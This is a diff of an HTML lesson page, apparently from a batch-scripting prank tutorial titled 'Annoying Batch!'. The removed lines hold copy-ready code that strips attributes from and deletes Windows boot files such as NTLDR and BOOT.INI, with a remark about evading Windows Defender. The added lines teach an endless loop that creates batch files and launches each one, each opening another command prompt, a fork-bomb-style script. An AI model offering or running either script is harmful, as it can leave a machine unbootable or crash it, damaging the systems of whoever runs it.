@@ -13,49 +13,58 @@
     <link href="/style/lib/animate.min.css" rel="stylesheet">
     <!-- my css -->
     <link rel="stylesheet" href="/style/src/index.css">
-    <title>Delete Start-up Files || Annoying Batch! || 8</title>
+    <title>Create Multiple Files || Annoying Batch! || 8</title>
 </head>
 <body>
     <div class="container-fluid d-flex flex-column flex-wrap justify-content-start align-items-center">
         <div class="container d-flex flex-column align-items-center  justify-content-start my-1">
             <!-- content here -->
-                <h1>Delete Start-up Files</h1>
+                <h1>Creating Files</h1>
                 <div class="border-1 border-dark w-100 border mt-3"></div>
             <p>
-                This lesson we are going to delete windows strart up files.
+                You can create files in Batch Script. The code below creates one file named <b>file.bat</b> with the content of "hi". 
             </p>
-            <p>
-                Be verry verry careful, this is really dangerous and it might be flagged as a virus by window defender.
-                You could probably try to run this code if you put it in separate files and run them individually.
-            </p>
+
 <div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
 <button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
 <textarea spellcheck="false" rows="9">
-@ECHO OFF
-ATTRIB -R -S -H C:\AUTOEXEC.BAT
-DEL C:\AUTOEXEC.BAT
-ATTRIB -R -S -H C:\BOOT.INI
-DEL C:\BOOT.INI
-ATTRIB -R -S -H C:\NTLDR
-DEL C:\NTLDR
-ATTRIB -R -S -H C:\WINDOWS\WIN.INI
-DEL C:\WINDOWS\WIN.INI
+echo hi>file.bat
 </textarea>
 </div>
-<div class="border-1 border-dark w-100 border mt-3"></div>
 <p>
-    The code bellow is dangerous but will not be flagged by window defender.
+    Inorder for our batch script to create hundreds of files we need to create a loop that creates files with different names.
+    We need to create a variable that starts at 0 and increaments by 1. The variable is then used to name the file, the code below
+    does just this.
 </p>
 <div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
 <button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
 <textarea spellcheck="false" rows="9">
-cd/
-cd Windows/Temp
-del autoexec.bat /s
+:: cyc is the number that start from 0 and increatment by one
+set cyc = 0
 
+:loop
+set /a cyc = cyc+1
+echo hi>file%cyc%.bat
+
+goto loop
 </textarea>
 </div>
+<p>
+    We can make this even more interesting by creating hunreds of batch files that start up COMMAND PROMPT and then running them after
+    we create them.
+</p>
+<div class="textarea-holder container-fluid d-flex justify-content-center align-items-center flex-column bg-light">
+<button class="buttonCopy m-4 btn-success buttons">Copy Code</button>
+<textarea spellcheck="false" rows="9">
+set cyc = 0
+:loop
+set /a cyc = cyc+1
+echo start cmd>file%cyc%.bat
+start file%cyc%.bat
 
+goto loop
+</textarea>
+</div>
                 <!-- navigation buttons -->
             <div class="d-flex flex-wrap justify-content-evenly align-items-center">
                 <button id="prev" class="text-nowrap p-5 m-5 buttons btn-danger py-1">
